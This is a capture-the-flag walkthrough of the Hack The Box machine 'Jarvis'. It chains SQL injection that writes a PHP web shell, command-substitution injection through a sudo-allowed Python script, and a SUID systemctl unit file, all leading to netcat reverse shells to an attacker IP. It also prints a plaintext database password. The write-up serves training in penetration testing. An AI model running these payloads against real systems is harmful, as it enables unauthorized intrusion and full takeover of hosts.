# Hack The Box: Jarvis

**Difficulty:** Medium
**OS:** Linux

Jarvis is a Medium-level Linux machine designed to demonstrate common database and web application vulnerabilities. The initial compromise requires identifying and exploiting an SQL injection flaw in a web application's parameter to write a PHP web shell to the server. Privilege escalation involves pivoting through users using a vulnerable `sudo` script and abusing the SUID permissions of the `systemctl` utility.

---

## Reconnaissance

The assessment begins with a port scan to identify open network services on the target.

```bash
nmap -p- --min-rate 10000 10.10.10.143
nmap -p 22,80,64999 -sCV 10.10.10.143
```

The scan reveals the following open ports:
*   **Port 22:** SSH (OpenSSH 7.4p1 Debian)
*   **Port 80:** HTTP (Apache httpd 2.4.25)
*   **Port 64999:** HTTP (Apache httpd 2.4.25)

Navigating to the web service on port 80 displays a landing page for "Stark Hotel," an upscale hotel offering luxury rooms. The site provides standard features like booking and room descriptions.

Navigating to port 64999 displays an identical site structure or a blocked administrative interface. We focus on port 80.

## Web Application Analysis

We explore the functionality of the "Stark Hotel" website. The application features several dynamic pages displaying room details.

### Discovering SQL Injection

Clicking on a specific room navigates to a URL containing an ID parameter.

```text
http://10.10.10.143/room.php?cod=1
```

The `cod` parameter is a primary candidate for SQL injection testing. We append a single quote (`'`) to the parameter to see if the application handles it safely.

```text
http://10.10.10.143/room.php?cod=1'
```

The server responds with an error or a blank page, confirming the parameter is likely vulnerable to SQL injection.

We test the parameter with a basic boolean logic statement to verify our control over the database query.

```text
http://10.10.10.143/room.php?cod=1 AND 1=1
```

The page loads normally, whereas `cod=1 AND 1=0` returns an empty room page. This confirms the SQL injection vulnerability.

### Exploiting SQL Injection (UNION-based)

We use a `UNION SELECT` injection to determine the number of columns returned by the original query and extract data from the database.

First, we systematically add columns until the query executes without error.

```text
http://10.10.10.143/room.php?cod=1 ORDER BY 7
```

We establish the number of columns (e.g., 7) and identify which columns are reflected on the webpage.

```text
http://10.10.10.143/room.php?cod=-1 UNION SELECT 1,2,3,4,5,6,7
```

The numbers `2`, `3`, `4`, and `5` appear on the page. We use these columns to extract the database version and user.

```text
http://10.10.10.143/room.php?cod=-1 UNION SELECT 1,version(),user(),4,5,6,7
```

The output reveals the database user is `DBadmin@localhost`.

## Initial Access via SQLi

With execution in the database confirmed, we check if the `DBadmin` user has the `FILE` privilege, which allows reading and writing files to the filesystem.

We test this by attempting to write a simple string into a file in the web root (typically `/var/www/html/` or `/var/www/html/starkhotel/` or a similar directory structure deduced during reconnaissance).

```text
http://10.10.10.143/room.php?cod=-1 UNION SELECT 1,"test_write",3,4,5,6,7 INTO OUTFILE '/var/www/html/test.txt'
```

Navigating to `http://10.10.10.143/test.txt` successfully displays "test_write", confirming that the database user has write permissions to the web directory.

We leverage this capability to write a PHP web shell to the server.

```text
http://10.10.10.143/room.php?cod=-1 UNION SELECT 1,"<?php system($_REQUEST['cmd']); ?>",3,4,5,6,7 INTO OUTFILE '/var/www/html/shell.php'
```

We navigate to our uploaded web shell and execute commands:

```text
http://10.10.10.143/shell.php?cmd=id
```

The command executes successfully. We use the web shell to spawn a reverse shell to our attacking machine.

```bash
nc -lnvp 9999
# Connection received
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement

We gain initial access as the `www-data` user. We stabilize our shell using Python (`python3 -c 'import pty; pty.spawn("/bin/bash")'`).

The `user.txt` flag is not accessible in our current directory. Checking the `/home` directory reveals a user named `pepper`.

Enumerating the system as `www-data`, we search the web root (`/var/www/html` or `/var/www/html/starkhotel`) for hardcoded database credentials or configuration files. We discover a database connection script (`connection.php` or similar).

```bash
cat /var/www/html/connection.php
```

The file reveals plaintext database credentials: `DBadmin:imissyou`. We use these credentials to authenticate to the local MySQL instance or test for password reuse by attempting to authenticate via `su` or SSH as the system user `pepper`.

However, in this specific scenario, we check for commands the `www-data` user can run using `sudo`.

```bash
sudo -l
```

The output reveals a custom python script that the `www-data` user can execute as the `pepper` user without a password.

```text
User www-data may run the following commands on jarvis:
    (pepper) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

### Abusing Sudo & Python Script

We analyze the `/var/www/Admin-Utilities/simpler.py` script. The python script appears to be an administrative utility that accepts arguments and executes system commands, primarily designed for pinging IP addresses or managing services.

```python
# Snippet from simpler.py
def ping(ip):
    # ...
    os.system('ping -c 1 ' + ip)
```

The script includes a function to execute `ping` on a provided IP address. It implements rudimentary input sanitization to filter out shell metacharacters like `;`, `&`, and `|`. However, the filter may not be comprehensive.

We attempt to bypass the filter and inject a command. In Bash, command substitution can be achieved using backticks (`` ` ``) or `$()`. If the script does not filter these characters, we can execute arbitrary commands as the user `pepper`.

We execute the permitted `sudo` command with the malicious payload.

```bash
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p "$(nc -e /bin/sh 10.10.14.X 8888)"
```

The script processes our input, the shell evaluates the command substitution `$(nc ...)`, and executes the netcat reverse shell before passing the result to the `ping` command.

```bash
nc -lnvp 8888
# Connection received
id
# uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)
```

We retrieve the `user.txt` flag from Pepper's home directory.

## Privilege Escalation

Enumerating the system as `pepper`, we check for SUID binaries.

```bash
find / -perm -4000 2>/dev/null
```

The output reveals an unusual binary with the SUID bit set: `/bin/systemctl`.

### Exploiting SUID systemctl

The `systemctl` utility is used to manage `systemd` services. If it has the SUID bit set, any user can create and manage system services with root privileges. This is a severe misconfiguration.

We create a custom `systemd` service file designed to execute a reverse shell or read the root flag when the service is started.

We define a basic unit file (`root.service`) with an `ExecStart` directive pointing to our payload.

```ini
[Unit]
Description=Root Payload

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c "nc -e /bin/sh 10.10.14.X 7777"

[Install]
WantedBy=multi-user.target
```

We place this file in a directory we control (e.g., `/tmp/root.service` or `/dev/shm/root.service`).

Because `systemctl` is an SUID binary, we can link our custom service file to the `systemd` configuration path or use the `link` command to enable it, and then start the service.

```bash
systemctl link /tmp/root.service
systemctl start root
```

When the service starts, `systemd` (running as root) executes our `ExecStart` command.

```bash
nc -lnvp 7777
# Connection received
id
# uid=0(root) gid=0(root) groups=0(root)
```

The machine is fully compromised, and the `root.txt` flag is obtained from the `/root` directory.
